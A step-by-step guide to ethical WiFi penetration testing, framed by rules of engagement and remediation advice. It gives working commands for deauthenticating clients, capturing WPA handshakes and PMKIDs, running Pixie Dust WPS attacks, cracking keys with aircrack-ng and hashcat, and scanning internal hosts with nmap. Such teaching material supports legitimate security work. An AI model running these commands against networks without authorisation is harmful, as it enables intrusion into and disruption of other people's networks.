# White Hat WiFi Penetration Testing: Strategy & Execution Guide

This document outlines the standard phases, strategies, and command-line execution steps for conducting ethical WiFi penetration testing. Always ensure you have explicit, written permission before testing any network.

---

## Phase 0: Pre-Engagement & Rules of Engagement (RoE)
**Strategy:** Before touching any tools, establish the boundaries. Define exactly what networks (SSIDs/BSSIDs) are in-scope. Determine if disruptive attacks (like prolonged Deauthentication or Denial of Service) are permitted. Establish communication channels with the client in case an attack causes unexpected network instability.

---

## Phase 1: Preparation & Interface Configuration
**Strategy:** Prepare your environment by identifying your wireless interface and putting it into "Monitor Mode." This allows your network card to listen to all traffic in the air, not just traffic directed at it.

**Execution:**
1. Check available wireless interfaces:
   ```bash
   iwconfig
   # OR
   ip a
   ```
   *Assume your interface is `wlan0` for the following commands.*

2. Kill conflicting processes that might interfere with monitor mode:
   ```bash
   sudo airmon-ng check kill
   ```

3. Enable Monitor Mode on your interface:
   ```bash
   sudo airmon-ng start wlan0
   # Your interface may be renamed, often to `wlan0mon`. Run `iwconfig` again to verify.
   ```

---

## Phase 2: Reconnaissance & Discovery
**Strategy:** Passively scan the airwaves to identify target networks, their configurations (encryption, channels), and any connected clients. The goal is to gather intelligence without directly interacting with the access point (AP).

**Execution:**
1. Discover all networks in range (Passive Scanning):
   ```bash
   sudo airodump-ng wlan0mon
   ```
   *Look for your target SSID. Note its BSSID (MAC address), Channel (CH), and Encryption type.*

2. Targeted Scanning: Focus on a specific target AP to capture detailed information and wait for client connections or handshakes.
   ```bash
   # Replace placeholders with your target's details
   sudo airodump-ng -c [CHANNEL] --bssid [TARGET_BSSID] -w capture_file wlan0mon
   ```
   *Leave this running in a terminal. It will save the captured packets to files starting with `capture_file`.*

---

## Phase 3: Exploitation (Attacks)
**Strategy:** Choose the appropriate attack vector based on the reconnaissance data.

### Strategy A: WPA/WPA2 4-Way Handshake Capture (Active)
This is the most common attack against WPA/WPA2-PSK networks. You actively kick a valid client off the network (Deauthentication). When the client's device automatically reconnects to the AP, you capture the cryptographic handshake, which contains the hashed password.

**Execution:**
1. While the targeted `airodump-ng` (from Phase 2) is running, open a new terminal.
2. Send Deauthentication packets to a specific client connected to the target AP:
   ```bash
   sudo aireplay-ng -0 5 -a [TARGET_BSSID] -c [CLIENT_MAC] wlan0mon
   ```
   *`-0 5` sends 5 deauth packets. If you omit `-c [CLIENT_MAC]`, it broadcasts deauth to all clients (noisy and potentially disruptive).*
3. Watch your `airodump-ng` terminal. If successful, you will see `[ WPA handshake: TARGET_BSSID ]` appear in the top right corner. Stop both processes once captured.

### Strategy B: PMKID Attack (Clientless capture)
Modern WPA/WPA2 routers append an optional field (PMKID) to the first frame of the authentication handshake. You can request this directly from the AP without needing a client to be connected or deauthenticating anyone.

**Execution:**
1. Use `hcxdumptool` to request the PMKID from the target AP:
   ```bash
   sudo hcxdumptool -i wlan0mon -o target_pmkid.pcapng --enable_status=1
   ```
   *Let this run until it indicates a successful PMKID capture.*
2. Convert the captured `.pcapng` file into a hash format suitable for Hashcat:
   ```bash
   hcxpcapngtool -o target_hash.hc22000 target_pmkid.pcapng
   ```

### Strategy C: WPS Attack (Pixie Dust / PIN Brute-force)
If the target AP has Wi-Fi Protected Setup (WPS) enabled, it may be vulnerable to PIN brute-forcing or an offline attack called Pixie Dust, which exploits poor random number generation in some routers to derive the PIN instantly.

**Execution:**
1. Identify APs with WPS enabled:
   ```bash
   wash -i wlan0mon
   ```
2. Attempt a Pixie Dust attack using Reaver:
   ```bash
   sudo reaver -i wlan0mon -b [TARGET_BSSID] -c [CHANNEL] -K 1 -vv
   ```
   *`-K 1` enables the Pixie Dust attack. If it fails, you can remove `-K 1` to attempt a standard (but very slow) PIN brute-force.*

---

## Phase 4: Offline Cracking
**Strategy:** Once you have the cryptographic material (Handshake or PMKID), move the attack offline. Use powerful hardware (GPUs) to guess the password against the captured hash using wordlists or rule-based attacks. This is completely silent to the target network.

**Execution:**
1. Prepare a wordlist. Kali Linux comes with `rockyou.txt` (needs to be extracted first):
   ```bash
   sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
   ```

2. **Cracking a Handshake (.cap file) using Aircrack-ng (CPU based):**
   ```bash
   aircrack-ng -w /usr/share/wordlists/rockyou.txt capture_file-01.cap
   ```

3. **Cracking Handshakes or PMKID (.hc22000 file) using Hashcat (GPU recommended, much faster):**
   ```bash
   hashcat -m 22000 -a 0 target_hash.hc22000 /usr/share/wordlists/rockyou.txt
   ```
   *`-m 22000` is the module for WPA-PBKDF2-PMKID+EAPOL.*

---

## Phase 5: Post-Exploitation & Reporting
**Strategy:** Once the pre-shared key (PSK) is obtained, connect to the network to assess the internal security posture (strictly within scope). Finally, compile the findings, demonstrating the risk and providing actionable remediation steps.

**Execution (Internal Assessment):**
1. Stop monitor mode and connect normally to the target network using the cracked password:
   ```bash
   sudo airmon-ng stop wlan0mon
   sudo systemctl restart NetworkManager
   ```
   *(Use the UI or `nmcli` to connect).*
2. Perform internal network discovery (e.g., finding active hosts):
   ```bash
   nmap -sn 192.168.1.0/24
   ```
3. Scan specific internal targets for open ports and services:
   ```bash
   nmap -sV -p- 192.168.1.50
   ```

**Reporting Strategy:** Document the exact tools used, commands executed, full paths to captured data, and the cracked password as Proof of Concept (PoC). Recommend mitigations such as disabling WPS, using a WPA2-AES/WPA3 key greater than 16 characters, or migrating to an enterprise 802.1X setup.
